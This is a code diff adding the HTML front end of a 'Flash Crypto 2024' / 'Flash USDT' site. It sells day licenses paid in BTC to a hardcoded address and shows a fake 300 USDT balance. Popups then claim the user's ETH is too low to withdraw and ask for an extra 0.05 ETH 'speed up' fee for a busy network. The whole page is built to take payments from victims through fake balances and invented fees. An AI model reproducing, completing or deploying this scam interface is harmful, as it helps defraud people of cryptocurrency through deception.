@@ -1,0 +1,183 @@
+<index.html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash Crypto 2024 - Nintendo Style</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="tetris-block" style="left: 10%; animation-delay: 0s;"></div>
+    <div class="tetris-block" style="left: 30%; animation-delay: 2s;"></div>
+    <div class="tetris-block" style="left: 50%; animation-delay: 4s;"></div>
+    <div class="tetris-block" style="left: 70%; animation-delay: 6s;"></div>
+    <div class="tetris-block" style="left: 90%; animation-delay: 8s;"></div>
+
+    <div class="container">
+        <svg class="logo" viewBox="0 0 100 100">
+            <rect x="10" y="10" width="80" height="80" fill="var(--primary-color)" />
+            <text x="50" y="65" font-size="40" text-anchor="middle" fill="white">FC</text>
+        </svg>
+
+        <div class="content">
+            <h1>Flash Crypto 2024</h1>
+            <p><span class="secure-icon"></span>Secure and efficient token experience on the ERC20 network.</p>
+
+            <div class="license-activation">
+                <h2>License Activation</h2>
+                <input type="text" id="licenseKey" placeholder="Enter License Key">
+                <input type="text" id="activationCode" placeholder="Enter Activation Code">
+                <button id="activateBtn">Activate</button>
+            </div>
+
+            <h2>License Plans</h2>
+            <div class="license-plans">
+                <div class="plan">
+                    <h3>Elite License</h3>
+                    <p>1 day $1500 -> 500k Flash Limit</p>
+                    <button class="contactBtn">Contact Us</button>
+                    <button class="purchaseBtn" data-plan="elite">Purchase</button>
+                </div>
+                <div class="plan">
+                    <h3>Lite License</h3>
+                    <p>1D $100 - Limited to 1k flash</p>
+                    <p>7D $500 - Limit</p>
+                    <button class="contactBtn">Contact Us</button>
+                    <button class="purchaseBtn" data-plan="lite">Purchase</button>
+                </div>
+                <div class="plan">
+                    <h3>Enterprise License</h3>
+                    <p>1D $500 - Limited to 25k flash</p>
+                    <button class="contactBtn">Contact Us</button>
+                    <button class="purchaseBtn" data-plan="enterprise">Purchase</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="walletPage" style="display: none;">
+        <button id="notificationButton">Notifications (1)</button>
+        <div id="notificationPopup">
+            <p>Welcome to FLASH USDT! Thank you for your License Purchase. You can now see your FLASH USDT balance.</p>
+        </div>
+
+        <h2>ETH receive Address</h2>
+        <p class="address">0xB1B9a6Ea97EFBe291c241a18Ff89227cA428AFF9</p>
+        <button class="copy-btn" data-address="0xB1B9a6Ea97EFBe291c241a18Ff89227cA428AFF9">Copy</button>
+        <p>This is your flash Wallet's ERC20 address</p>
+
+        <div class="wallet">
+            <div class="coin">
+                <div class="coin-symbol">Ξ</div>
+                <h3>ETH</h3>
+                <p>Balance: <span id="ethBalance">0.0000</span> ETH</p>
+            </div>
+            <div class="coin">
+                <div class="coin-symbol">Ḃ</div>
+                <h3>BNB</h3>
+                <p>Balance: <span id="bnbBalance">0.0000</span> BNB</p>
+            </div>
+            <div class="coin">
+                <div class="coin-symbol">₮</div>
+                <h3>USDT</h3>
+                <p>Balance: <span id="usdtBalance">300.0000</span> USDT</p>
+            </div>
+            <div class="coin">
+                <div class="coin-symbol">₿</div>
+                <h3>BTC</h3>
+                <p>Balance: <span id="btcBalance">0.0000</span> BTC</p>
+            </div>
+        </div>
+
+        <button id="loadBtn">Load</button>
+        <button id="transferBtn">Transfer</button>
+
+        <div class="transaction-history">
+            <h2>Transaction History</h2>
+            <button id="speedUpBtn">Speed Up all transactions</button>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Date/Time</th>
+                        <th>Value</th>
+                        <th>Status</th>
+                        <th>Details</th>
+                    </tr>
+                </thead>
+                <tbody id="transactionHistory"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <div id="paymentPopup" class="popup">
+        <span class="close-popup">&times;</span>
+        <h2>Send Payment</h2>
+        <div id="countdown"></div>
+        <p>Send the exact total amount required for the auto detection of your payment</p>
+        <svg width="50" height="50" viewBox="0 0 50 50">
+            <circle cx="25" cy="25" r="23" fill="#f2a900"/>
+            <text x="25" y="35" font-size="30" text-anchor="middle" fill="#fff">₿</text>
+        </svg>
+        <p>Only send BTC to this address</p>
+        <h3>BTC</h3>
+        <p id="btcAddress">bc1qvyzw9wdtru8equvj64scy5nn5swqv8njenmhls</p>
+        <button id="copyBtcAddress">Copy</button>
+        <h3>Total Amount</h3>
+        <p id="paymentAmount"></p>
+    </div>
+
+    <div id="invalidLicensePopup" class="popup">
+        <span class="close-popup">&times;</span>
+        <p>Invalid license Details</p>
+    </div>
+
+    <div id="loadWalletPopup" class="popup">
+        <span class="close-popup">&times;</span>
+        <h2>Load Wallet</h2>
+        <select id="coinSelect">
+            <option value="">SELECT</option>
+            <option value="ETH">ETH</option>
+            <option value="BNB">BNB</option>
+            <option value="USDT">USDT</option>
+            <option value="BTC">BTC</option>
+        </select>
+        <h3>Address for Deposit</h3>
+        <p id="depositAddress"></p>
+        <button id="copyDepositAddress">COPY ADDRESS</button>
+    </div>
+
+    <div id="transferPopup" class="popup">
+        <span class="close-popup">&times;</span>
+        <h2>Transfer USDT</h2>
+        <svg width="50" height="50" viewBox="0 0 50 50">
+            <circle cx="25" cy="25" r="23" fill="#26a17b"/>
+            <text x="25" y="35" font-size="24" text-anchor="middle" fill="#fff">₮</text>
+        </svg>
+        <p>Amount: 300.0000 USDT</p>
+        <h3>Your USDT(erc20):</h3>
+        <input type="text" id="usdtAddress" placeholder="Enter USDT CRYPTO ADDRESS">
+        <button id="sendUsdtBtn">SEND</button>
+    </div>
+
+    <div id="insufficientEthPopup" class="popup">
+        <span class="close-popup">&times;</span>
+        <p>Your ETH balance is Insufficient for sending USDT/erc20. Please Top up Balance.</p>
+    </div>
+
+    <div id="speedUpPopup" class="popup">
+        <span class="close-popup">&times;</span>
+        <h2>Network in High use</h2>
+        <p>Our network is in constant use and this may cause delays in its operation.</p>
+        <p>For priority in your transaction, a fee of 0.05 ETH will be charged to make your transaction complete faster.</p>
+        <p>We apologize for the occasion.</p>
+        <button id="confirmSpeedUpBtn">Speed Up</button>
+    </div>
+
+    <div id="insufficientEthSpeedUpPopup" class="popup">
+        <span class="close-popup">&times;</span>
+        <p>Your ETH balance is insufficient to speed up the transaction. Minimum fee: 0.05 ETH</p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
